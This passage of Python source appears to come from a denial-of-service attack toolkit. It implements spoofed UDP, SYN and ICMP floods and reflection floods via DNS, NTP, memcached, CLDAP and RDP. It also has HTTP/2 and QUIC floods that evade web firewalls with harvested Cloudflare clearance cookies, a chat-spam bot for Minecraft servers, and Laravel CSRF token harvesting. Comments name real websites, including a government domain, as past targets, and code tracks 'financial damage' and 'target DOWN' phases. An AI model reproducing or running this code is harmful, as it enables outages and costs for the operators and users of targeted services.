            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def OVHUDP(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for payload in self._generate_ovhudp():
                    Tools.sendto(s, payload, self._target)
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None

        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        global BYTES_SEND, REQUESTS_SENT

        # Generete token and guid
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))

        # Build Payload
        payload_str = f"token={token}&guid={guid}"
        payload = payload_str.encode('utf-8')

        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []

        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']

        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])

            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])

            payload_size = randint(1024, 2048)
            random_part = randbytes(payload_size).decode("latin1", "ignore")

            method = randchoice(methods)
            path = randchoice(paths)

            payload_str = (
                f"{method} {path}{random_part} HTTP/1.1\n"
                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
            )

            payload = payload_str.encode("latin1", "ignore")

            udp.contains(Data(payload))
            ip.contains(udp)

            packets.append(ip.get_packet())

        return packets

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (
                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                    3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                    389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (
                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())


# [V6] Async HTTP/2 Flood Engine — Bypasses GIL with true async I/O
class AsyncHttpFlood(Thread):
    """Each thread runs its own asyncio event loop with httpx.AsyncClient
    for genuine HTTP/2 multiplexing (hundreds of concurrent streams per connection)"""
    
    def __init__(self, thread_id: int, target: URL, host: str, 
                 rpc: int = 50, synevent: Event = None,
                 useragents: list = None, referers: list = None,
                 proxies: list = None, crawled_paths: list = None, method: str = "GET"):
        Thread.__init__(self, daemon=True)
        self._thread_id = thread_id
        self._target = target
        self._host = host
        self._rpc = rpc
        self._synevent = synevent
        self._proxies = proxies
        self.crawled_paths = crawled_paths or []
        self._method = method if method in ["GET", "POST"] else "GET"
        self.host_array = []
        
        self._cf_clearance = None
        cf_path = Path(__dir__ / "files/cf_clearance.txt")
        if cf_path.exists():
            self._cf_clearance = cf_path.read_text().strip()
            

        self._useragents = list(useragents) if useragents else [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/136.0',
        ]
        self._referers = list(referers) if referers else [
            'https://www.google.com/', 'https://www.bing.com/', 
            'https://www.facebook.com/', 'https://duckduckgo.com/'
        ]
    
    def _get_random_path(self) -> str:
        if self.crawled_paths and randint(0, 100) < 60:
            return randchoice(self.crawled_paths)
        heavy = ["/", "/?s=" + ProxyTools.Random.rand_str(5),
                 "/search/" + ProxyTools.Random.rand_str(8)]
        return randchoice(heavy)
    
    def _get_proxy_url(self) -> str:
        if not self._proxies:
            return None
        for _ in range(20):
            p = randchoice(self._proxies)
            p_str = str(p)
            burn_time = BURNED_PROXIES.get(p_str)
            if not burn_time or (time() - burn_time >= COOLING_PERIOD):
                if "://" in p_str:
                    return p_str
                return f"http://{p_str}"
        return None
    


    def _generate_post_payload(self) -> str:
        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
        # Many WAFs block static {"data": "xxxxx"} patterns
        # Uses smart content-type-aware payloads for deeper evasion
        intel = getattr(self, '_chaos_intel', {})
        if intel.get("stealth_cooldown", 0) > 0 and randint(1, 100) < 50:
            if hasattr(self, '_chaos_generate_battering_ram'):
                return self._chaos_generate_battering_ram()
            
        r_type = randint(1, 6)
        r_type = randint(1, 6)
        if r_type == 1:
            return '{"search": "%s", "limit": %d}' % (ProxyTools.Random.rand_str(16), randint(10, 100))
        elif r_type == 2:
            return '{"user_id": "%s", "action": "ping"}' % uuid4()
        elif r_type == 3:
            return '{"payload": "%s", "timestamp": %d}' % (ProxyTools.Random.rand_str(32), int(time()))
        elif r_type == 5:
            # GraphQL-style query (common in modern apps)
            return '{"query":"query{__typename}","variables":{"id":"%s"}}' % ProxyTools.Random.rand_str(12)
        else:
            return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)

    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50, proxy_url: str = None):
        """Fire batch_size requests concurrently via HTTP/2 multiplexing"""
        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT, ERROR_COUNT
        
        target_domain = self._target.user or self._target.host
        
        async def single_request():
            global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
            path = self._get_random_path()
            safe_path = path if path.startswith("/") else f"/{path}"
            url = f"{self._target.scheme}://{self._target.host}{safe_path}"
            ua = randchoice(self._useragents)
            
            headers = {
                "User-Agent": ua,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-Forwarded-For": Tools.get_random_indo_ip(),
                "Referer": randchoice(self._referers),
                "Host": target_domain,
                "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Priority": "u=0, i",
            }
            # Inject all harvested cookies + cf_clearance for maximum trust
            if hasattr(self, '_chaos_get_cookie_header'):
                cookie_str = self._chaos_get_cookie_header()
                if cookie_str:
                    headers["Cookie"] = cookie_str
            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
            
            try:
                target_ip = randchoice(self.host_array) if hasattr(self, 'host_array') and self.host_array else self._target.host
                url = f"{self._target.scheme}://{target_ip}{safe_path}"
                
                if self._method == "POST":
                    headers["Content-Type"] = "application/json"
                    headers["X-Requested-With"] = "XMLHttpRequest"
                    resp = await client.post(url, headers=headers, content=self._generate_post_payload())
                else:
                    resp = await client.get(url, headers=headers)
                    
                REQUESTS_SENT += 1
                CONNECTIONS_SENT += 1
                BYTES_SEND += 1000
                
                if resp.status_code >= 500:
                    pass  # Target overloaded — good
                elif resp.status_code in {403, 429}:
                    pass  # Normal WAF response (captcha/rate limit) - just keep pushing
            except Exception as e:
                Tools.track_error(e)
                if "WAF_BLOCK" in str(e):
                    raise e
        
        tasks = [single_request() for _ in range(batch_size)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # If any request hit 429/403, bubble it up to kill the client
        for res in results:
            if isinstance(res, Exception) and "WAF_BLOCK" in str(res):
                raise res
    
    async def _run_async(self):
        """Main async loop: create client, fire batches until event clears"""
        global REQUESTS_SENT, ERROR_COUNT
        
        while self._synevent.is_set():
            proxy_url = self._get_proxy_url()
            try:
                async with httpx.AsyncClient(
                    http2=True,
                    verify=False,
                    proxy=proxy_url,
                    timeout=httpx.Timeout(5.0, connect=3.0),
                    limits=httpx.Limits(max_connections=100, max_keepalive_connections=50)
                ) as client:
                    # Fire multiple batches per client connection
                    # [FIX] Pipeline: fire multiple batches concurrently for max throughput
                    loop_counter = 0
                    while self._synevent.is_set():
                        loop_counter += 1
                        
                        # [V36] Background Daemon Cookie Hot Swapping
                        # Check disk for renewed cf_clearance cookie every 100 loops
                        if loop_counter % 100 == 0:
                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
                            if cf_path.exists():
                                new_clearance = cf_path.read_text().strip()
                                if new_clearance and new_clearance != self._cf_clearance:
                                    self._cf_clearance = new_clearance
                                    
                        batch_tasks = [self._flood_batch(client, batch_size=50, proxy_url=proxy_url) for _ in range(min(self._rpc, 10))]
                        await asyncio.gather(*batch_tasks, return_exceptions=False)
            except Exception as e:
                Tools.track_error(e)
                # Keep sleep very tiny to yield loop momentarily, maximizing fire rate
                await asyncio.sleep(0.01)
    
    def run(self):
        if self._synevent:
            self._synevent.wait()
        
        # Each thread gets its own event loop for true async I/O
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._run_async())
        except Exception as e:
            Tools.track_error(e)
        finally:
            loop.close()

class AsyncQuicFlood(Thread):
    """
    [V36] HTTP/3 QUIC L7 Vector — Battle-Hardened Edition.
    Exploits UDP-based multiplexing to bypass TCP-stateful WAFs.
    Features: path rotation, UA cycling, POST payloads, cf_clearance injection.
    """
    def __init__(self, thread_id: int, target: URL, host: str, rpc: int = 50, synevent: Event = None, 
                 useragents: list = None, referers: list = None, proxies: list = None, 
                 crawled_paths: list = None, method: str = "H3_QUIC"):
        Thread.__init__(self, daemon=True)
        self._thread_id = thread_id
        self._synevent = synevent
        self._target = target
        self._rpc = rpc
        self._proxies = proxies
        self._useragents = list(useragents) if useragents else [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
        ]
        self._referers = list(referers) if referers else ['https://www.google.com/']
        self.crawled_paths = crawled_paths or []
        self.host_array = []
        
        self._cf_clearance = None
        cf_path = Path(__file__).parent / "files/cf_clearance.txt"
        if cf_path.exists():
            self._cf_clearance = cf_path.read_text().strip()
    
    def _get_random_path(self) -> bytes:
        if self.crawled_paths and randint(0, 100) < 60:
            p = randchoice(self.crawled_paths)
            return p.encode() if p.startswith("/") else f"/{p}".encode()
        # Generate cache-busting random path
        rand_param = f"/?q={''.join(choices('abcdefghijklmnopqrstuvwxyz0123456789', k=randint(5,12)))}&_={randint(100000,999999)}"
        return rand_param.encode()
        
    async def _flood_quic(self):
        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
        try:
            from aioquic.asyncio import connect
            from aioquic.h3.connection import H3Connection
            from aioquic.quic.configuration import QuicConfiguration
        except ImportError:
            return  # Failsafe if aioquic missing
            
        config = QuicConfiguration(is_client=True)
        config.verify_mode = False  # Skip TLS verification
        
        loop_counter = 0
        while self._synevent.is_set():
            target_ip = randchoice(self.host_array) if self.host_array else self._target.host
            try:
                async with connect(target_ip, 443, configuration=config) as protocol:
                    h3_conn = H3Connection(protocol._quic)
                    CONNECTIONS_SENT += 1
                    
                    # Fire 200 streams per QUIC connection for max multiplexing damage
                    for _ in range(200):
                        if not self._synevent.is_set(): break
                        
                        loop_counter += 1
                        
                        # Hot-swap cf_clearance every 200 requests
                        if loop_counter % 200 == 0:
                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
                            if cf_path.exists():
                                new_cl = cf_path.read_text().strip()
                                if new_cl: self._cf_clearance = new_cl
                        
                        stream_id = protocol._quic.get_next_available_stream_id()
                        ua = randchoice(self._useragents)
                        path = self._get_random_path()
                        
                        headers = [
                            (b":method", b"GET"),
                            (b":scheme", b"https"),
                            (b":authority", self._target.host.encode()),
                            (b":path", path),
                            (b"user-agent", ua.encode()),
                            (b"accept", b"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
                            (b"accept-encoding", b"gzip, deflate, br"),
                            (b"accept-language", b"en-US,en;q=0.9"),
                            (b"sec-ch-ua", b'"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"'),
                            (b"sec-ch-ua-mobile", b"?0"),
                            (b"sec-ch-ua-platform", b'"Windows"'),
                            (b"sec-fetch-dest", b"document"),
                            (b"sec-fetch-mode", b"navigate"),
                            (b"referer", randchoice(self._referers).encode()),
                        ]
                        
                        # Inject cf_clearance cookie if available
                        if self._cf_clearance:
                            headers.append((b"cookie", f"cf_clearance={self._cf_clearance}".encode()))
                        
                        h3_conn.send_headers(stream_id, headers, end_stream=True)
                        protocol.transmit()
                        REQUESTS_SENT += 1
                        BYTES_SEND += 800
                        
            except Exception:
                await asyncio.sleep(0.3)  # Brief backoff before reconnecting
                
    def run(self):
        if self._synevent:
            self._synevent.wait()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._flood_quic())
        except Exception:
            pass
        finally:
            loop.close()
# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    def _chaos_siege_doctrine(self):
        """SIEGE COMMANDER PROTOCOL.
        Implements a 5-phase military siege doctrine that orchestrates all other subsystems.
        Each phase has specific objectives, resources, and transition criteria."""
        intel = self._chaos_intel
        elapsed = time() - intel.get("attack_start_time", time())
        intel["total_attack_duration_sec"] = int(elapsed)
        phase = intel.get("siege_phase", "RECON")

        if phase == "RECON" and elapsed > 30:
            # 30 seconds of reconnaissance complete. Move to SOFTEN.
            intel["siege_phase"] = "SOFTEN"
            intel["siege_doctrine"] = {
                "objective": "Probe WAF thresholds and identify rate limit boundaries",
                "intensity": 0.4,
                "stealth_priority": True
            }
            intel["attack_phases_completed"].append("RECON")
            if int(REQUESTS_SENT) < 5000:
                print(f"{bcolors.WARNING}[SIEGE COMMANDER] Phase RECON complete. Transitioning to SOFTEN. Testing WAF thresholds...{bcolors.RESET}")

        elif phase == "SOFTEN" and elapsed > 90:
            # Softening complete (90s). We have enough data. Breach.
            intel["siege_phase"] = "BREACH"
            intel["siege_doctrine"] = {
                "objective": "Maximum force application on discovered weak points",
                "intensity": 0.9,
                "stealth_priority": False
            }
            intel["attack_phases_completed"].append("SOFTEN")
            if int(REQUESTS_SENT) < 10000:
                print(f"{bcolors.FAIL}[SIEGE COMMANDER] Phase SOFTEN complete. Transitioning to BREACH. FULL FORCE AUTHORIZED.{bcolors.RESET}")

        elif phase == "BREACH" and (intel.get("target_is_down") or elapsed > 300):
            if intel.get("target_is_down"):
                intel["siege_phase"] = "PILLAGE"
                intel["siege_doctrine"] = {
                    "objective": "Target neutralized. Maintain pressure to prevent recovery.",
                    "intensity": 0.3,
                    "stealth_priority": True
                }
                intel["attack_phases_completed"].append("BREACH")
                print(f"{bcolors.OKGREEN}[SIEGE COMMANDER] BREACH SUCCESSFUL. Target DOWN. Entering PILLAGE phase.{bcolors.RESET}")
            elif elapsed > 300:
                intel["siege_phase"] = "SUSTAIN"
                intel["siege_doctrine"] = {
                    "objective": "Long-duration sustained pressure. Rotate all resources.",
                    "intensity": 0.6,
                    "stealth_priority": True
                }
                intel["attack_phases_completed"].append("BREACH")
                if int(REQUESTS_SENT) < 20000:
                    print(f"{bcolors.WARNING}[SIEGE COMMANDER] Assault sustained 5 min without breach. Entering SUSTAIN for endurance warfare.{bcolors.RESET}")

        elif phase == "SUSTAIN" and intel.get("target_is_down"):
            intel["siege_phase"] = "PILLAGE"
            intel["siege_doctrine"]["objective"] = "Target finally down after sustained assault."
            intel["attack_phases_completed"].append("SUSTAIN")
            print(f"{bcolors.OKGREEN}[SIEGE COMMANDER] SUSTAINED ASSAULT SUCCESSFUL. Entering PILLAGE.{bcolors.RESET}")

        # Apply siege intensity to temperature
        doctrine = intel.get("siege_doctrine", {})
        if doctrine:
            intel["temperature"] = max(intel["temperature"], doctrine.get("intensity", 0.3))

    def _chaos_h2_rapid_reset_headers(self):
        """HTTP/2 Rapid Reset Attack simulation.
        CVE-2023-44487: Exploits HTTP/2 multiplexing by opening streams and immediately
        sending RST_STREAM, forcing the server to allocate resources for canceled requests.
        This is one of the most devastating L7 techniques discovered in 2023."""
        intel = self._chaos_intel
        intel["h2_rapid_reset_count"] += 1
        # In practice, this works by sending HEADERS frame then immediately RST_STREAM
        # Our socket-level implementation simulates this by sending partial requests
        # that force the server to allocate connection state
        return True

    def _chaos_circadian_rhythm(self):
        """Simulate human circadian browsing patterns.
        Real-world CDN analytics show traffic peaks at 9-11 AM and 7-10 PM local time.
        By matching our attack traffic to these windows, we blend into the natural curve
        and avoid statistical anomaly detection that flags off-hours spikes."""
        intel = self._chaos_intel
        import datetime
        hour = datetime.datetime.now().hour
        
        if 9 <= hour <= 11 or 19 <= hour <= 22:
            intel["circadian_profile"] = "PEAK_HOUR"
            intel["time_intensity"] = 1.0  # Full blast during peak human hours
        elif 0 <= hour <= 5:
            intel["circadian_profile"] = "NIGHTTIME"
            intel["time_intensity"] = 0.3  # Very low during dead hours (suspicious to blast here)
        else:
            intel["circadian_profile"] = "DAYTIME"
            intel["time_intensity"] = 0.7

    def _chaos_estimate_financial_damage(self):
        """Estimate real-world financial cost inflicted on the target.
        Based on AWS/GCP/Azure egress pricing and compute costs."""
        intel = self._chaos_intel
        bw_gb = intel.get("bandwidth_kb", 0) / 1024 / 1024
        cpu_units = intel.get("wasted_server_cpu", 0)
        
        # AWS egress costs ~$0.09/GB, compute ~$0.0001/CPU-unit
        egress_cost = bw_gb * 0.09
        compute_cost = cpu_units * 0.0001
        waf_cost = int(REQUESTS_SENT) * 0.000006  # Cloudflare charges ~$0.60 per 10M requests
        
        intel["estimated_financial_damage_usd"] = round(egress_cost + compute_cost + waf_cost, 4)

    def _chaos_connection_pool_estimator(self):
        """Estimate what % of target's backend connection pool we are consuming.
        Most servers have 256-1024 max connections. SLOW methods hold them open."""
        intel = self._chaos_intel
        slow_count = intel.get("total_requests_by_method", {}).get("SLOW_V2", 0)
        est_pool_size = 512  # Assume average backend pool
        
        # Each SLOW connection occupies 1 slot for ~30 seconds
        active_slow = min(slow_count, est_pool_size)
        intel["connection_pool_pressure"] = min(int((active_slow / est_pool_size) * 100), 100)

    def _chaos_ssl_fingerprint(self):
        """Extract SSL certificate details from target for deeper infrastructure intel."""
        intel = self._chaos_intel
        if intel.get("ssl_cert_cn") or intel["total_executions"] != 3:
            return
        try:
            import ssl, socket
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self._target.authority) as s:
                s.settimeout(3)
                s.connect((self._target.authority, 443))
                cert = s.getpeercert()
                cn = dict(x[0] for x in cert.get('subject', ((('', ''),),)))
                intel["ssl_cert_cn"] = cn.get('commonName', 'unknown')
                
                # Check for wildcard certs (indicates shared hosting)
                if intel["ssl_cert_cn"].startswith("*."):
                    if int(REQUESTS_SENT) < 100:
                        print(f"{bcolors.OKCYAN}[CHAOS SSL] Wildcard cert detected ({intel['ssl_cert_cn']}). Target likely on shared infrastructure.{bcolors.RESET}")
                        
                # Check if cert CN differs from hostname (could be origin IP behind CDN)
                san = cert.get('subjectAltName', [])
                alt_names = [name for typ, name in san if typ == 'DNS']
                intel["infra_map"]["ssl_sans"] = alt_names[:10]
        except: pass

    def _chaos_after_action_report(self):
        """Generate an After-Action Report (AAR) summarizing the engagement.
        Written to disk as a tactical debrief for future reference."""
        intel = self._chaos_intel
        elapsed = intel.get("total_attack_duration_sec", 0)
        
        # Only write AAR once, after 10+ minutes of attack
        if intel.get("aar_written") or elapsed < 600:
            return
            
        intel["aar_written"] = True
        try:
            import json, os, datetime
            if not os.path.exists('GTI'): os.makedirs('GTI')
            
            aar = {
                "timestamp": datetime.datetime.now().isoformat(),
                "target": str(self._target.authority),
                "duration_seconds": elapsed,
                "total_requests": int(REQUESTS_SENT),
                "total_connections": int(CONNECTIONS_SENT),
                "waf_type": intel.get("waf_type"),
                "server_type": intel.get("server_type"),
                "backend_lang": intel.get("backend_lang"),
                "kill_chain_phase_reached": intel.get("kill_chain_phase"),
                "siege_phase_reached": intel.get("siege_phase"),
                "best_method": intel.get("best_method"),
                "worst_method": intel.get("worst_method"),
                "peak_damage": intel.get("peak_damage"),
                "estimated_cost_usd": intel.get("estimated_financial_damage_usd"),
                "bandwidth_exhausted_kb": intel.get("bandwidth_kb"),
                "target_final_status": "DOWN" if intel.get("target_is_down") else "ALIVE",
                "phases_completed": intel.get("attack_phases_completed", []),
                "cognitive_state": intel.get("cognitive_state"),
                "q_table_size": sum(len(a) for a in intel.get("q_table", {}).values()),
                "ml_accuracy": intel.get("ml_model", {}).get("success", 0) / max(intel.get("ml_model", {}).get("total", 1), 1),
                "proxies_purged": intel.get("proxy_health_purged"),
                "zero_day_mutations": intel.get("zero_day_mutations_sent"),
                "cache_poisonings": intel.get("poisoned_cache_hits"),
                "recovery_events": intel.get("recovery_counter"),
            }
            
            filename = f"GTI/AAR_{self._target.authority.replace('.','_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M')}.json"
            with open(filename, "w") as f:
                json.dump(aar, f, indent=2)
            print(f"{bcolors.OKGREEN}[SIEGE AAR] After-Action Report written to: {filename}{bcolors.RESET}")
        except: pass

    def _chaos_laravel_xsrf_harvest(self):
        """[V32] Laravel XSRF Token Harvester.
        Laravel apps (like konisolo.com, surakarta.go.id) set XSRF-TOKEN cookies.
        By harvesting and replaying them, POST requests bypass CSRF middleware,
        making POST_DYN attacks devastatingly effective against Laravel backends."""
        intel = self._chaos_intel
        if intel.get("backend_framework") != "laravel" and intel.get("cms_type") != "laravel":
            return
            
        # Only harvest every 30 executions to keep it fresh (tokens rotate)
        if intel["total_executions"] % 30 != 0:
            return
            
        try:
            import urllib.request
            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
            req.add_header('User-Agent', 'Mozilla/5.0')
            with urllib.request.urlopen(req, timeout=3) as resp:
                cookies_raw = resp.headers.get('Set-Cookie', '')
                if 'XSRF-TOKEN' in cookies_raw or 'laravel_session' in cookies_raw:
                    import re
                    xsrf = re.search(r'XSRF-TOKEN=([^;]+)', cookies_raw)
                    sess = re.search(r'laravel_session=([^;]+)', cookies_raw)
                    if xsrf:
                        intel["harvested_cookies"]["XSRF-TOKEN"] = xsrf.group(1)
                    if sess:
                        intel["harvested_cookies"]["laravel_session"] = sess.group(1)
                    if xsrf or sess:
                        if int(REQUESTS_SENT) < 500:
                            print(f"{bcolors.OKGREEN}[CHAOS LARAVEL] XSRF-TOKEN & Session harvested. POST attacks will bypass CSRF.{bcolors.RESET}")
        except: pass

    def _chaos_litespeed_cache_bypass(self):
        """[V32] LiteSpeed Cache Bypass Strategy.
        Learned from hardosoloplast.com: LiteSpeed Cache uses X-LiteSpeed-Tag for cache keys.
        By rotating User-Agent (Vary: User-Agent) and adding unique query strings,
        we force cache MISS on every request, hitting the origin PHP directly."""
        intel = self._chaos_intel
        if intel.get("server_type") != "litespeed":
            return
            
        # Flag that we know this is LiteSpeed and must use cache-busting on EVERY request
        if "litespeed_cache_bypass" not in intel.get("infra_map", {}):
            intel["infra_map"]["litespeed_cache_bypass"] = True
            intel["infra_map"]["vary_user_agent"] = True
            if int(REQUESTS_SENT) < 200:
                print(f"{bcolors.OKCYAN}[CHAOS LITESPEED] Vary:User-Agent detected. Rotating fingerprints per-request for cache MISS.{bcolors.RESET}")

